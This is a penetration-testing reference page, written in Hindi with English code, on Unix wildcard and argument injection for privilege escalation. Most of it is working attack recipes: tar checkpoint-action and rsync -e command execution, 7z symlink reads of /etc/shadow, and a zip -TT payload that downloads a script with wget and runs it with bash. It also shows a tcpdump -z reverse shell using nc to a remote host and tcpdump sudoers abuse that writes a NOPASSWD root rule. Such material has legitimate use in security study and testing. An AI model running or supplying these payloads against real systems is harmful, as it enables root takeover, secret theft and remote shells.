# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** तब होता है जब कोई privileged script बिना quotes वाले wildcard जैसे `*` के साथ `tar`, `chown`, `rsync`, `zip`, `7z`, … जैसी Unix binary चलाता है।
> चूंकि shell binary को execute करने से **पहले** wildcard को expand करता है, इसलिए working directory में files create कर सकने वाला attacker ऐसे filenames बना सकता है जो `-` से शुरू हों, ताकि उन्हें **data के बजाय options** के रूप में interpret किया जाए। इस तरह arbitrary flags या यहां तक कि commands को प्रभावी रूप से smuggle किया जा सकता है।<sup>[[6]](#references)</sup>
> यह page 2023-2025 के लिए सबसे उपयोगी primitives, हालिया research और modern detections एकत्र करता है।

## chown / chmod

Wildcard द्वारा किसी option जैसे filename के expand होने पर `--reference` flag का दुरुपयोग करके आप **किसी reference file से owner/group या permission bits copy कर सकते हैं**।<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
जब root बाद में कुछ इस तरह execute करता है:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
विस्तारित `--reference=.drf.php` स्पष्ट owner/mode को override करता है, जिससे matching files `.drf.php` से metadata inherit करती हैं (और, ऊपर दिए गए setup के साथ, attacker द्वारा writable बन जाती हैं)।<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack)।<sup>[[7]](#references)</sup>
विवरण के लिए classic DefenseCode paper भी देखें।<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

GNU tar के **checkpoint** feature और checkpoint actions का दुरुपयोग करके arbitrary commands execute करें।<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
जब root `tar -czf /root/backup.tgz *` चलाता है, तो `shell.sh` को root के रूप में execute किया जाता है।<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override caveat

हाल के macOS में default `tar` (`libarchive` पर आधारित) GNU tar का `--checkpoint` interface प्रदान नहीं करता, लेकिन bsdtar बाहरी compressor चुनने के लिए **--use-compress-program** को document करता है।<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
जब कोई privileged script `tar -cf backup.tar *` चलाती है, तो यह victim के `PATH` के माध्यम से `sh` चुनती है और bsdtar उसे compressor के रूप में शुरू करता है।<sup>[[11]](#references)</sup> यह option injection को सिद्ध करता है, लेकिन अपने-आप में यह arbitrary-command primitive का विश्वसनीय साधन नहीं है: wildcard से बनाई गई filename में `/` नहीं हो सकता, और bsdtar archive data देता है, न कि attacker द्वारा चुना गया shell command। Code execution के लिए अतिरिक्त रूप से ऐसे controllable executable की आवश्यकता होती है जिसे `PATH` के माध्यम से resolve किया जा सके, या किसी अन्य argument channel की, जिससे किसी उपयोगी program का नाम दिया जा सके।

---

## rsync

`rsync` आपको `-e` और `--rsync-path` जैसे command-line flags के माध्यम से remote shell या remote binary को override करने देता है।<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
यदि root बाद में `rsync -az * backup:/srv/` के साथ directory को archive करता है, तो injected flag remote-shell mechanism के माध्यम से shell चला सकता है।<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode)।

---

## 7-Zip / 7z / 7za

भले ही privileged script option parsing को रोकने के लिए wildcard के आगे `--` सावधानीपूर्वक जोड़ती हो, 7-Zip CLI filename के आगे `@` लगाकर **file list files** स्वीकार करता है। इसे symlink के साथ मिलाने पर आप *arbitrary files exfiltrate* कर सकते हैं।<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
यदि root कुछ इस तरह execute करता है:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip `root.txt` (→ `/etc/shadow`) को file list के रूप में पढ़ने का प्रयास करेगा और विफल हो जाएगा, **जिससे contents stderr पर print होंगे**।<sup>[[13]](#references)</sup>

यह `-- *` के बाद भी काम करता है, क्योंकि 7-Zip CLI positional inputs के रूप में regular filenames और `@listfiles` दोनों को explicitly स्वीकार करता है, इसलिए `@root.txt` जैसा literal filename अब भी special रूप से treat किया जाता है।<sup>[[13]](#references)</sup>

---

## zip

जब कोई application user-controlled filenames को `zip` में pass करती है (या तो wildcard के माध्यम से या `--` के बिना names enumerate करके), तब दो बहुत practical primitives उपलब्ध होते हैं।<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` “test archive” enable करता है और `-TT <cmd>` tester को arbitrary program से replace करता है (long form: `--unzip-command <cmd>`). यदि आप ऐसे filenames inject कर सकते हैं जो `-` से शुरू होते हैं, तो short-options parsing को काम करने देने के लिए flags को अलग-अलग filenames में split करें।<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
नोट्स
- `'-T -TT <cmd>'` जैसी single filename का इस्तेमाल करने की कोशिश न करें — short options को प्रति character parse किया जाता है और यह fail हो जाएगा। दिखाए गए अनुसार अलग-अलग tokens का इस्तेमाल करें।<sup>[[3]](#references)</sup>
- यदि app filenames से slashes हटा देता है, तो bare host/IP से fetch करें (default path `/index.html`) और `-O` के साथ locally save करें, फिर execute करें।<sup>[[3]](#references)</sup>
- अपने tokens को कैसे consume किया जा रहा है, यह समझने के लिए `-sc` (processed argv दिखाता है) या `-h2` (अधिक help) के साथ parsing debug कर सकते हैं।<sup>[[3]](#references)</sup>

उदाहरण (zip 3.0 पर local behavior)।<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: यदि web layer `zip` के stdout/stderr को echo करती है (naive wrappers में आम), तो `--help` जैसे injected flags या bad options से होने वाली failures HTTP response में दिखाई देंगी, जिससे command-line injection की पुष्टि होगी और payload tuning में सहायता मिलेगी।<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

जब कोई privileged wrapper writable directory को wildcard के साथ expand करता है, तो इन documented option hooks की जांच करना उपयोगी है।<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | किसी command string को shell में pass करता है |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push के लिए SSH के बजाय `<cmd>` का उपयोग करता है |
| `scp`   | `-S <program>` | किसी alternate SSH-compatible connection program का उपयोग करता है |

ये primitives पारंपरिक *tar/rsync/zip* के अलावा उपयोगी checks हैं।

---

## Hunting vulnerable wrappers and jobs

Recent case studies और detection guidance से पता चलता है कि wildcard/argv injection अब केवल **cron + tar** की समस्या नहीं है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> यही bug class निम्नलिखित में भी बार-बार दिखाई देती है:

- attacker-controlled upload directories से "download everything as zip/tar" करने वाले web features
- vendor/appliance debug shells, जो attacker-controlled filename/filter fields वाला **tcpdump** wrapper expose करते हैं
- ऐसे backup या rotation jobs, जो writable directories पर `tar`, `rsync`, `7z`, `zip`, `chown`, या `chmod` चलाते हैं

उपयोगी triage commands (`pspy` invocation में इसके documented process/file-event और interval flags का उपयोग होता है)।<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
त्वरित heuristics:

- `-- *` कई GNU tools के लिए एक अच्छा fix है, लेकिन `7z`/`7za` के लिए **नहीं**, क्योंकि `@listfiles` को अलग से parse किया जाता है।<sup>[[13]](#references)</sup>
- `zip` के लिए ऐसे wrappers खोजें जो user-controlled filenames को सीधे enumerate करते हों; short-option splitting (`-T` + `-TT <cmd>`) shell glob के बिना भी काम करता है।<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` के लिए उन wrappers पर विशेष ध्यान दें जो आपको **output file names**, **rotation settings** या **capture-file replay** arguments को control करने देते हैं।<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): wrappers में argv injection के जरिए RCE

जब कोई restricted shell या vendor wrapper user-controlled fields (जैसे "file name" parameter) को strict quoting/validation के बिना जोड़कर `tcpdump` command line बनाता है, तो आप अतिरिक्त `tcpdump` flags को smuggle कर सकते हैं। `-G` (time-based rotation), `-W` (files की संख्या सीमित करना) और `-z <cmd>` (post-rotate command) का combo tcpdump चलाने वाले user के रूप में arbitrary command execution देता है (अक्सर appliances पर root)।<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

आवश्यक शर्तें:

- आप `tcpdump` को दिए जाने वाले `argv` को प्रभावित कर सकते हैं (जैसे `/debug/tcpdump --filter=... --file-name=<HERE>` जैसा wrapper)।<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper file name field में spaces या `-`-prefixed tokens को sanitize नहीं करता।<sup>[[4]](#references)</sup>

Classic PoC (एक writable path से reverse shell script execute करता है)।<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
विवरण:

- `-G 1` हर सेकंड rotate करता है, और `-W 1` एक rotated file के बाद रुक जाता है; rotation से पहले capture को matching packet प्राप्त होना चाहिए।<sup>[[18]](#references)</sup>
- `-z <cmd>` प्रत्येक rotation के बाद एक बार post-rotate command चलाता है और बंद किए गए savefile path को argument के रूप में पास करता है; सुनिश्चित करें कि script/interpreter का argument handling आपके payload से मेल खाता हो।<sup>[[18]](#references)</sup>

Removable media के बिना variants:

- यदि आपके पास files लिखने के लिए कोई अन्य primitive है (जैसे एक अलग command wrapper जो output redirection की अनुमति देता है), तो अपनी script को किसी ज्ञात path में रखें और `-z /path/script.sh` trigger करें; आवश्यकता होने पर script स्वयं `/bin/sh` invoke करे।<sup>[[18]](#references)</sup>
- यदि कोई vendor wrapper आपको rotated path चुनने देता है, तो उस path control का audit केवल ऐसे post-rotate command के संयोजन में करें जो उसके savefile argument को interpret करता हो; केवल path control से file contents execute नहीं होते।<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

sudoers anti-pattern का उदाहरण:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
यह rule tcpdump के documented parser के अंतर्गत कई options उपलब्ध छोड़ता है:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob और permissive patterns केवल पहले `-w` argument को सीमित करते हैं। `tcpdump` कई `-w` options स्वीकार करता है; अंतिम वाला प्रभावी होता है।<sup>[[3]](#references)[[18]](#references)</sup>
- यह rule अन्य options को सीमित नहीं करता, इसलिए `-Z`, `-r`, `-V` आदि allowed हैं।<sup>[[3]](#references)[[18]](#references)</sup>

प्रासंगिक primitives नीचे documented हैं।<sup>[[3]](#references)[[18]](#references)</sup>
- दूसरे `-w` के साथ destination path को override करें (पहला केवल sudoers को संतुष्ट करता है)।<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal का उपयोग पहले `-w` के अंदर constrained tree से बाहर निकलने के लिए करें।<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` के साथ output ownership को बाध्य करें (कहीं भी root-owned files बनाता है)।<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` के माध्यम से crafted PCAP को replay करके arbitrary-content write (जैसे, sudoers line डालना)।<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>ऐसा PCAP बनाएं जिसमें exact ASCII payload हो और उसे root के रूप में लिखें</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-V <file>` के साथ Arbitrary file read/secret leak (savefiles की सूची को interpret करता है)। Error diagnostics अक्सर lines को echo करते हैं, जिससे content leak हो सकता है।<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection के माध्यम से संभावित Shell का पता चला](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) manual](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) manual](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip command line syntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) manual](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` manual](https://man.openbsd.org/scp)
- [18] [tcpdump(8) manual](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
